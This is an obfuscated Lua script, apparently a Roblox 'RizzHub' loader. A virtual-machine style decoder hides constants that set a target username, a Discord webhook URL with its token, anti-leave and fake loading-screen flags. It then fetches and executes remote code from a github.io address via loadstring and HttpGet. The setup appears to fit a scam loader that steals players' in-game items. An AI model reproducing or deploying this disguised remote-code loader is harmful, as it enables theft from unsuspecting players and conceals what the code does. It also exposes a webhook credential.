--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v68=0;while true do if (v68==0) then v19=v0(v3(v30,1,1));return "";end end else local v69=v2(v0(v30,16));if v19 then local v78=0;local v79;while true do if (v78==0) then v79=v5(v69,v19);v19=nil;v78=1;end if (v78==1) then return v79;end end else return v69;end end end);local function v20(v31,v32,v33)if v33 then local v70=0 -0 ;local v71;while true do if ((89 -((215 -134) + 8))==v70) then v71=(v31/(2^(v32-(2 -1))))%(2^(((v33-(1 -0)) -(v32-(1697 -(1656 + 40)))) + ((2291 -(362 + 684)) -(598 + (1152 -506))))) ;return v71-(v71%(2 -1)) ;end end else local v72=(1747 -((1764 -(305 + 65)) + 351))^(v32-(1248 -(94 + (2845 -(37 + 1655))))) ;return (((v31%(v72 + v72))>=v72) and (1 + 0)) or 0 ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0;local v36;local v37;while true do if ((4 -3)==v35) then return (v37 * (1837 -(568 + 652 + 361))) + v36 ;end if (v35==(1349 -((1727 -880) + 502))) then v36,v37=v1(v16,v18,v18 + (1239 -(346 + (3451 -2560))) );v18=v18 + (1021 -(54 + 965)) ;v35=1;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 + 0 );v18=v18 + 1 + 3 ;return (v41 * 16777216) + (v40 * (193148 -127612)) + (v39 * (588 -332)) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=2 -1 ;local v45=(v20(v43,1 -0 ,43 -(17 + 6) ) * ((1 + 1 + 0)^(137 -105))) + v42 ;local v46=v20(v43,71 -(33 + 17) ,20 + 11 );local v47=((v20(v43,32)==1) and  -(1 + 0)) or (1142 -(843 + 298)) ;if (v46==(0 + 0)) then if (v45==(769 -(649 + 120))) then return v47 * (0 + 0) ;else local v80=454 -(94 + 360) ;while true do if ((1918 -(453 + 1465))==v80) then v46=1;v44=0;break;end end end elseif (v46==(2196 -(20 + 50 + 79))) then return ((v45==(0 -(0 + 0))) and (v47 * ((311 -(195 + 115))/((0 -0) + 0)))) or (v47 * NaN) ;end return v8(v47,v46-(652 + 371) ) * (v44 + (v45/((325 -(222 + 101))^(24 + 28)))) ;end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==0) then return "";end end v49=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;local v50={};for v66=3 -2 , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=644 -(626 + 18) ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51==(4 -1)) then v58=nil;while true do local v81=0 + 0 ;local v82;while true do if (v81~=(1651 -(683 + 968))) then else v82=0 -0 ;while true do if (v82==(478 -(142 + 336))) then if (v52~=(1 + 1)) then else local v107=146 -(48 + 98) ;local v108;local v109;while true do if (v107~=(0 -0)) then else v108=0;v109=nil;v107=1;end if ((116 -(62 + 53))~=v107) then else while true do if (v108~=(0 + 0)) then else v109=0 -0 ;while true do local v144=0;while true do if (v144==(0 -0)) then if (1~=v109) then else local v160=0 + 0 ;local v161;while true do if (v160==(0 -0)) then v161=0 + 0 ;while true do if (v161~=0) then else local v179=0;while true do if (v179~=(780 -(394 + 386))) then else for v184=1781 -(1008 + 772) ,v23() do v55[v184]=v23();end return v56;end end end end break;end end end if ((1293 -(534 + 759))==v109) then for v162=1 + 0 ,v23() do local v163=0 + 0 ;local v164;local v165;local v166;while true do if (v163==(1 + 0)) then v166=nil;while true do if (v164~=(0 -0)) then else local v182=0 -0 ;while true do if (v182~=1) then else v164=1 + 0 ;break;end if (v182~=(0 + 0)) then else v165=0 -0 ;v166=nil;v182=78 -(55 + 22) ;end end end if (v164~=1) then else while true do if (v165~=(0 + 0)) then else v166=v21();if (v20(v166,1 -0 ,1 + 0 )~=(0 + 0)) then else local v187=0 + 0 ;local v188;local v189;local v190;local v191;while true do if (2~=v187) then else while true do if (v188~=(1639 -(1134 + 503))) then else local v192=0 + 0 ;while true do if (v192~=1) then else v188=10 -7 ;break;end if (v192==(0 -0)) then local v197=0 -0 ;while true do if ((0 -0)~=v197) then else if (v20(v190,1,324 -(60 + 263) )~=(2 -1)) then else v191[2]=v58[v191[2]];end if (v20(v190,2,4 -2 )~=(2 -1)) then else v191[1209 -(155 + 1051) ]=v58[v191[3]];end v197=1 + 0 ;end if (v197~=(4 -3)) then else v192=1182 -(377 + 804) ;break;end end end end end if ((1370 -(191 + 1178))~=v188) then else local v193=0 + 0 ;while true do if ((343 -(175 + 168))==v193) then v191={v22(),v22(),nil,nil};if (v189==(1089 -(1023 + 66))) then local v198=0 + 0 ;local v199;while true do if (0==v198) then v199=259 -(134 + 125) ;while true do if (v199==(0 + 0)) then v191[159 -(136 + 20) ]=v22();v191[1008 -(306 + 698) ]=v22();break;end end break;end end elseif (v189==(2 -1)) then v191[3]=v23();elseif (v189==(4 -2)) then v191[246 -(221 + 22) ]=v23() -(2^(1434 -(193 + 1225))) ;elseif (v189~=3) then else local v208=0;local v209;while true do if (v208==(0 -0)) then v209=0;while true do if (v209==(1698 -(445 + 1253))) then v191[597 -(10 + 584) ]=v23() -((1498 -(1004 + 492))^(4 + 12)) ;v191[4]=v22();break;end end break;end end end v193=1 + 0 ;end if (v193~=1) then else v188=2;break;end end end if (v188~=(1347 -(625 + 719))) then else if (v20(v190,1 + 2 ,2 + 1 )~=(133 -(91 + 41))) then else v191[1900 -(531 + 1365) ]=v58[v191[4]];end v53[v162]=v191;break;end if (v188==0) then v189=v20(v166,6 -4 ,1244 -(745 + 496) );v190=v20(v166,2 + 2 ,1633 -(880 + 747) );v188=1 + 0 ;end end break;end if (v187==0) then v188=0;v189=nil;v187=1 -0 ;end if (v187~=(1671 -(1330 + 340))) then else v190=nil;v191=nil;v187=7 -5 ;end end end break;end end break;end end break;end if ((0 -0)~=v163) then else local v175=947 -(478 + 469) ;while true do if (v175~=(1 + 0)) then else v163=1 -0 ;break;end if (v175==0) then v164=0 + 0 ;v165=nil;v175=1612 -(24 + 1587) ;end end end end end for v167=1 + 0 ,v23() do v54[v167-(895 -(249 + 645)) ]=v28();end v109=1 -0 ;end break;end end end break;end end break;end end end if (v52==(1316 -(1158 + 158))) then local v110=1131 -(1016 + 115) ;local v111;while true do if (v110~=(0 -0)) then else v111=1581 -(1190 + 391) ;while true do if ((1 -0)==v111) then local v142=0;local v143;while true do if (v142==0) then v143=0;while true do if (v143~=(0 -0)) then else v55={};v56={v53,v54,nil,v55};v143=249 -(108 + 140) ;end if (v143==1) then v111=1926 -(1416 + 508) ;break;end end break;end end end if ((828 -(114 + 712))==v111) then v52=1;break;end if (v111~=(0 -0)) then else v53={};v54={};v111=1 + 0 ;end end break;end end end v82=4 -3 ;end if (v82==(2 -1)) then if (v52==(434 -(392 + 41))) then local v112=1647 -(1017 + 630) ;while true do if (v112==(4 -2)) then v52=2;break;end if (v112~=(0 -0)) then else local v115=42 -(20 + 22) ;while true do if (v115==(4 -3)) then v112=1136 -(1051 + 84) ;break;end if (v115==(0 + 0)) then v57=v23();v58={};v115=1 + 0 ;end end end if (v112==(1 + 0)) then local v116=0 -0 ;local v117;while true do if (v116~=0) then else v117=0;while true do if (v117==(0 -0)) then for v148=1 + 0 ,v57 do local v149=1055 -(67 + 988) ;local v150;local v151;local v152;while true do if (v149==(4 -3)) then v152=nil;while true do if (v150==(1 -0)) then if (v151==1) then v152=v21()~=(1063 -(445 + 618)) ;elseif (v151==(2 -0)) then v152=v24();elseif (v151~=(221 -(85 + 133))) then else v152=v25();end v58[v148]=v152;break;end if ((0 + 0)~=v150) then else v151=v21();v152=nil;v150=1;end end break;end if (v149~=(0 + 0)) then else v150=328 -(299 + 29) ;v151=nil;v149=1;end end end v56[826 -(537 + 286) ]=v21();v117=1 + 0 ;end if (v117~=1) then else v112=1210 -(336 + 872) ;break;end end break;end end end end end break;end end break;end end end break;end if (v51==(2 -1)) then local v73=0;local v74;while true do if (v73~=(0 -0)) then else v74=0 + 0 ;while true do if (v74~=(1 + 0)) then else v51=3 -1 ;break;end if (v74==0) then local v105=0;while true do if (v105==0) then v54=nil;v55=nil;v105=1;end if (v105~=1) then else v74=1 + 0 ;break;end end end end break;end end end if (v51~=(6 -4)) then else v56=nil;v57=nil;v51=3;end if (v51==(0 -0)) then v52=0;v53=nil;v51=1 -0 ;end end end local function v29(v59,v60,v61)local v62=0;local v63;local v64;local v65;while true do if (v62==0) then v63=v59[1];v64=v59[2];v62=1;end if (v62==1) then v65=v59[3];return function(...)local v83=1;local v84= -1;local v85={...};local v86=v12("#",...) -1 ;local function v87()local v88=v63;local v89=v64;local v90=v65;local v91=v27;local v92={};local v93={};local v94={};for v98=0 -(0 -0) ,v86 do if ((1661<=(100 + 1099 + (1425 -(394 + 436)))) and (v98>=v90)) then v92[v98-v90 ]=v85[v98 + 1 ];else v94[v98]=v85[v98 + 1 ];end end local v95=(v86-v90) + (1794 -(1388 + 405)) ;local v96;local v97;while true do local v99=0;while true do if (((4203 -(3542 -953))<=(3958 -(1104 + 288))) and (v99==0)) then local v106=(0 + 0) -0 ;while true do if ((v106==(1049 -(281 + 475 + 293))) or (3115==(1591 -(200 + (41 -12))))) then v96=v88[v83];v97=v96[1 + 0 ];v106=483 -(103 + 379) ;end if (((4002 -(1134 + 27 + 2))>=(8923 -6477)) and (v106==(1 + (0 -0)))) then v99=1 -0 ;break;end end end if ((v99==(1 + 0)) or ((652 -(668 -(176 + 295)))>=(4142 -(1013 + 250)))) then if ((v97<=(824 -(46 + 773))) or ((3715 -1823)>=2560)) then if (((13883 -9371)>=(13235 -8804)) and (v97<=(4 -2))) then if (((2209 + 546)<=(5552 -1550)) and (v97<=((855 -(170 + 685)) -0))) then v94[v96[2]]();elseif ((v97>(521 -((163 -105) + 462))) or (2830==(4822 -2192))) then v94[v96[2]][v96[(2025 -(999 + 740)) -(79 + (1585 -(734 + 647))) ]]=v96[2 + 2 ];else v83=v96[988 -(648 + 337) ];end elseif ((v97<=((3 -1) + 1)) or (870>=(5032 -3558))) then do return;end elseif ((((1532 + 3828) -(334 + 1089))>=(3958 -(150 + 1013))) and (v97>(1152 -(768 + (2224 -(639 + 1205)))))) then local v123=0;local v124;local v125;local v126;local v127;local v128;local v129;while true do if ((v123==((3921 -2137) -(1559 + 224))) or ((115 + 4756)<=(1862 -1030))) then v126=nil;v127=nil;v123=5 -3 ;end if ((v123==(1716 -(408 + 1305))) or (1877==(1336 + 64 + 578))) then while true do if (((4865 -(863 + 819))>=((492 + 47) -(6 + 3 + 5))) and (v124==(1 + 0))) then local v153=0 + (0 -0) ;while true do if (((1484 + 3113 + 398)>(3480 -(620 + 375 + 525))) and (v153==0)) then v127=nil;v128=nil;v153=1 -(0 -0) ;end if (((560 + 189)<4834) and (v153==(1 + 0))) then v124=237 -(200 + 19 + 16) ;break;end end end if ((v124==(0 + 0 + 0)) or ((1826 -(260 + 483))==(4932 -(4805 -(188 + 1664))))) then local v154=0;while true do if (((9968 -7079)<(4220 -937)) and (v154==(683 -(444 + 238)))) then v124=2 -1 ;break;end if (((2209 -((359 -157) + 647))>974) and (v154==0)) then v125=0 -0 ;v126=nil;v154=1 + 0 + 0 ;end end end if ((v124==2) or (3557>(4238 -(557 + 55)))) then v129=nil;while true do if (((2068 -(331 + 661))<(2787 + 172)) and (v125==(1 -0))) then local v169=0 + 0 ;local v170;while true do if ((v169==(1722 -(1563 + 159))) or ((2863 -(3695 -2493))<=(2003 -(445 + 669)))) then v170=0;while true do if (((1532 + 3164)>=2276) and (v170==(273 -(202 + 70)))) then v125=1 + 1 ;break;end if (((45 + 93)==(44 + 94)) and (v170==(0 + 0))) then v84=(v128 + v126) -(1 -(0 + 0)) ;v129=0 + 0 ;v170=1654 -(99 + 1554) ;end end break;end end end if ((v125==(1 + 1)) or ((1756 -(19 + (10 -3)))>2872)) then for v173=v126,v84 do local v174=(0 -0) -0 ;while true do if ((((3202 + 949) -2464)>(2321 -(874 + 766))) and (v174==(420 -(323 + 97)))) then v129=v129 + 1 + 0 ;v94[v173]=v127[v129];break;end end end break;end if (((11572 -7501)>2246) and (v125==(0 -0))) then local v171=0;local v172;while true do if (((0 -0)==v171) or (((3015 -(257 + 248)) -1320)>(3679 -1320))) then v172=0;while true do if ((v172==(1144 -(140 + 1003))) or ((636 -193)>=2549)) then v125=1 + 0 ;break;end if (((3843 -(278 + (1765 -(802 + 321))))==2923) and (v172==(0 + 0))) then local v183=0;while true do if ((4472>(1732 -(630 + 394))) and (v183==(0 + 0))) then v126=v96[1 + 1 ];v127,v128=v91(v94[v126](v13(v94,v126 + ((919 -(335 + 582)) -(1 + 0)) ,v96[2 + 1 ])));v183=2 -(1 + 0) ;end if ((1==v183) or ((4233 -(5 + 5))>=(5032 -(379 + 174)))) then v172=1 + 0 ;break;end end end end break;end end end end break;end end break;end if ((v123==2) or (1345==(30 + 819))) then v128=nil;v129=nil;v123=(298 -(113 + 180)) -2 ;end if (((2590 -1395)<=(5701 -((1980 -(369 + 421)) + 188))) and ((0 + 0)==v123)) then v124=0 -(665 -(625 + 40)) ;v125=nil;v123=2 -1 ;end end else local v130=0 -0 ;local v131;while true do if ((v130==0) or (4681<(1941 + 1850))) then v131=v96[2 -0 ];v94[v131]=v94[v131](v13(v94,v131 + 1 + (0 -0) ,v84));break;end end end elseif ((v97<=(8 + 0)) or ((251 + 875)>=((2025 + 1525) -((1664 -(709 + 860)) + 93)))) then if (((4294 -(371 + 720 + 639))>(1222 + (722 -466))) and (v97<=(3 + 3))) then v61[v96[3]]=v94[v96[7 -(1299 -(486 + 808)) ]];elseif ((v97>7) or ((1845 -1319)>=(2233 -(597 + 291)))) then v94[v96[2]]=v96[2 + (685 -(640 + 44)) ];else v94[v96[(2155 -1483) -((1341 -749) + 78) ]]=v96[6 -3 ]~=(0 -(0 -0)) ;end elseif ((v97<=(28 -19)) or ((5235 -3247)>=(1683 + 928))) then if (((4470 -(214 + 769))>2062) and (v94[v96[2 + 0 ]]==v96[11 -7 ])) then v83=v83 + ((4848 -3235) -(1602 + (273 -(93 + 170)))) ;else v83=v96[860 -(825 + (1000 -(454 + 514))) ];end elseif (((5460 -3888)>(1925 -(142 + (2926 -(1190 + 172))))) and (v97==(19 -9))) then local v136=0 + 0 ;local v137;local v138;local v139;while true do if ((v136==(0 -0)) or ((1002 + (729 -308))>=4793)) then v137=1482 -(566 + 916) ;v138=nil;v136=3 -2 ;end if ((v136==1) or (3246<=(2552 -(938 + 839)))) then v139=nil;while true do if ((v137==(701 -(312 + 388))) or ((796 + 2040 + 858)==231)) then v94[v138 + 1 + 0 ]=v139;v94[v138]=v139[v96[4 + 0 ]];break;end if (((3331 -((679 -358) + 289))>=(1305 -748)) and (v137==(1319 -(959 + 360)))) then local v158=0;local v159;while true do if ((v158==(0 + 0)) or ((625 + 20)>=(14041 -(12120 -(98 + 1029))))) then v159=0 + 0 ;while true do if (((5453 -((462 -296) + 1615))>(5406 -2907)) and ((0 -0)==v159)) then v138=v96[85 -(73 + 10) ];v139=v94[v96[3 + (579 -(481 + 98)) ]];v159=1;end if (((1 + (1350 -(385 + 965)))==v159) or ((5332 -(6487 -3004))>(4719 -1307))) then v137=1056 -(178 + 877) ;break;end end break;end end end end break;end end else v94[v96[(2 -1) + 1 + 0 ]]=v61[v96[1 + 2 ]];end v83=v83 + 1 ;break;end end end end A,B=v27(v11(v87));if  not A[1] then local v100=v59[4][v83] or "?" ;error("Script error at ["   .. v100   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!1B3O00028O00027O004003023O005F4703093O0046697273745465787403103O0053637269707420507265706172696E67030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E03093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E026O000840026O00F03F03093O00416E74694C656176652O0103093O004D6F7573654C6F636B030A3O005363726970744E616D6503073O0052692O7A487562030B3O0057616974696E6754696D65026O002440030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403213O00682O7470733A2O2F72692O7A36392E6769746875622E696F2F4D61696E2E6C756103083O00557365724E616D65030A3O00736C656B726F773O3903073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313038363332333634373938393432302O31332F6835747749304170654969564B616D442D6F6861577467625A7861334F3237584B5A694878516A5A4F41536C7177785A726577575270686A524364345A716E7935783135030D3O004C6F6164696E675363722O656E002B3O0012083O00013O0026093O000A000100020004013O000A000100120B000100033O00300200010004000500120B000100033O00300200010006000700120B000100033O0030020001000800090012083O000A3O0026093O00130001000B0004013O0013000100120B000100033O0030020001000C000D00120B000100033O0030020001000E000D00120B000100033O0030020001000F00100012083O00023O0026093O00200001000A0004013O0020000100120B000100033O00300200010011001200120B000100133O00120B000200143O00200A000200020015001208000400164O0007000500014O0005000200054O000400013O00024O0001000100010004013O002A00010026093O0001000100010004013O00010001001208000100183O001206000100173O0012080001001A3O001206000100193O00120B000100033O0030020001001B000D0012083O000B3O0004013O000100012O00033O00017O002B3O00023O00043O00043O00053O00053O00063O00063O00073O00073O00083O000A3O000A3O000B3O000B3O000C3O000C3O000D3O000D3O000E3O00103O00103O00113O00113O00123O00123O00123O00123O00123O00123O00123O00123O00133O00153O00153O00163O00163O00173O00173O00183O00183O00193O001A3O001C3O00",v9(),...);end